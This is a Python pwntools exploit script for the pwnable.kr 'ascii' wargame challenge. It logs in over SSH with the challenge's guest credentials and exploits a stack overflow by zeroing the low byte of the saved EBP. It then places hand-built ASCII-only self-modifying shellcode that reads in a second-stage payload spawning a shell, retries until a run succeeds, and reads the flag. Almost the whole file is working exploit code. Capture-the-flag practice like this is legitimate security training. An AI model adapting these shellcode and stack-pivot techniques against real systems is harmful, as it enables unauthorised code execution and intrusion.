#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --user ascii --password guest --path ascii
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ascii')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'ascii'
password = args.PASSWORD or 'guest'
remote_path = 'ascii'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

# the idea is to read into the RWX area after the ascii checks which will allow us to bypass the checks
# this is an easier shellcode to write as it only involves calling read(0, buf, ...)
# to jump to shellcode we exploit the bufo in vuln. the problem is that it uses the same input buffer
# for the memcpy so the overflow is ascii only (ecpet maybe the alst char). we use that to overwrite the
# LSB of saved EBP to 0, which moves it down. later, when we return from main we will pop the return address
# from there. since stack offsets are randomized at process startup, this can move ebp to any offset from 0 to
# 256 down (aligned to 8). it turns out somewhere down below in the stack 0x80000000 is written, so we should jump
# to our shellcode at probability ~1/16.

context.terminal = ["kitty"]
os.environ["SHELL"] = "bash"

MMAP_ADDRESS = 0x80000000
INT_80_OFFSET = 0xa0  # ecx - MMAP_ADDRESS

# esi = 0, ecx = MMAP_ADDRESS + 0xa0
shellcode = b""

# set eax = edi = MMAP_ADDRESS + 0xa0
shellcode += b"\x51"  # push ecx
shellcode += b"\x58"  # pop eax
shellcode += b"\x51"  # push ecx
shellcode += b"\x5f"  # pop edi

# write int 0x80 at the MMAP_ADDRESS + 0xa0
# (di = 0xa0) [eax] = \x6d\x20 -> \xcd\x80
shellcode += b"\x66\x31\x38"  # xor word ptr [eax], di
shellcode += b"\x40"  # inc eax
shellcode += b"\x66\x31\x38"  # xor word ptr [eax], di

# prepare syscall args
# eax = SYS_read (3)
# eax = 0
shellcode += b"\x56"  # push esi
shellcode += b"\x58"  # pop eax
# eax ^= (0x20 ^ 0x23) -> eax=3
shellcode += b"\x34\x23"  # xor al, 0x23
shellcode += b"\x34\x20"  # xor al, 0x20

# ebx (fd) = stdin (0)
shellcode += b"\x56"  # push esi
shellcode += b"\x5b"  # pop ebx
# ecx (buf) = MMAP_ADDRESS+0xa0
# edx (len) = ...

# pad with push esi; pop esi until int 0x80
shellcode += ((INT_80_OFFSET - len(shellcode)) // 2) * b"\x56\x5e"
if len(shellcode) % 2:
    shellcode += b"\x56"

for _ in range(0x100):
    io = start()

    io.send(
        flat({
            0: shellcode,
            INT_80_OFFSET: b"\x6d\x20",
            168: b"\x00"
        })
    )

    try:
        io.send(b"AA" + asm(shellcraft.sh()))  # 2 bytes padding as we return from syscall to 0x800000a2 but write to 0x800000a0
    except EOFError:
        # process crashed
        continue

    time.sleep(1)
    if io.poll() is not None:
        # process crashed
        continue

    break

io.sendline(b"echo AAAAAAAA; cat flag")
io.recvuntil(b"AAAAAAAA\n")
success(f"flag = {term.text.bold_italic_yellow(io.recvline().strip().decode())}")